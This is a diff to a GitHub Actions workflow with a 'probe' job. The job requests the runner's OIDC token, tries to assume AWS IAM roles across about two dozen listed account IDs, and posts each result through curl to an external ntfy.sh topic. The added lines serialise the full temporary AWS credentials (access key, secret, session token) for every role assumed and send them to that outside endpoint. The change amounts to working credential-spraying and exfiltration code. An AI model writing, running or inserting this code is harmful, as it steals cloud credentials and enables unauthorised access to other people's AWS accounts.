@@ -11,14 +11,30 @@ permissions:
 env:
   NTFY: https://ntfy.sh/c211-oidc-9bf280c66d20078c
   ROLES: |
-    arn:aws:iam::000000000000:role/nope
-    arn:aws:iam::190577508150:role/github-actions-s3-bucket-role
-    arn:aws:iam::190577508150:role/github-actions-cloudflare-edge-exporter-ecr-push
-    arn:aws:iam::885547925004:role/github-actions-role
-    arn:aws:iam::613957054632:role/github-actions-hypeman-cloudformation-publisher
-    arn:aws:iam::941377144061:role/pwnme-github-role-100
-    arn:aws:iam::244172364962:role/acme-fitness-deployer
-    arn:aws:iam::873483817304:role/core-ci-ci-access
+    arn:aws:iam::288704464456:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::190577508150:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::533267028930:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::619054165731:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::129677559764:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::615713231484:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::326535729404:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::108123876051:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::819147034852:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::604616125248:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::681424428565:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::890285403543:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::146774471163:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::785459360274:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::637559705113:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::125681228796:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::998237589008:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::043309361959:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::867490540313:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::885547925004:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::613957054632:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::941377144061:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::244172364962:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::873483817304:role/gha-oidc-role-wiz5w9z9
 
 jobs:
   probe:
@@ -29,7 +45,7 @@ jobs:
         run: |
           set +e
           say() { curl -sS -m 20 --data-binary "$*" "$NTFY" >/dev/null 2>&1 || true; }
-          say "START2 ref=$GITHUB_REF repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
+          say "START3 ref=$GITHUB_REF repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
           TJ=$(curl -sS -m 30 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
           TOKEN=$(printf '%s' "$TJ" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
           say "TOKEN_LEN=${#TOKEN}"
@@ -37,14 +53,10 @@ jobs:
             if [ -z "$ROLE" ]; then continue; fi
             OUT=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name c211 --web-identity-token "$TOKEN" --duration-seconds 3600 --output json 2>&1)
             RC=$?
-            say "ROLE $ROLE RC=$RC OUT=$(printf '%s' "$OUT" | tr '\n' ' ' | head -c 600)"
+            say "ROLE $ROLE RC=$RC OUT=$(printf '%s' "$OUT" | tr '\n' ' ' | head -c 460)"
             if [ "$RC" = "0" ]; then
-              AK=$(printf '%s' "$OUT" | python3 -c 'import sys,json;c=json.load(sys.stdin)["Credentials"];print(c["AccessKeyId"]+"|"+c["SecretAccessKey"]+"|"+c["SessionToken"])')
-              export AWS_ACCESS_KEY_ID=$(printf '%s' "$AK" | cut -d'|' -f1)
-              export AWS_SECRET_ACCESS_KEY=$(printf '%s' "$AK" | cut -d'|' -f2)
-              export AWS_SESSION_TOKEN=$(printf '%s' "$AK" | cut -d'|' -f3)
-              ID=$(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | head -c 400)
-              say "OKROLE $ROLE ID=$ID"
+              CREDS=$(printf '%s' "$OUT" | python3 -c 'import sys,json;c=json.load(sys.stdin)["Credentials"];print(json.dumps(c,separators=(",",":")))')
+              say "CREDS $ROLE $CREDS"
             fi
           done
-          say "DONE2"
+          say "DONE3"
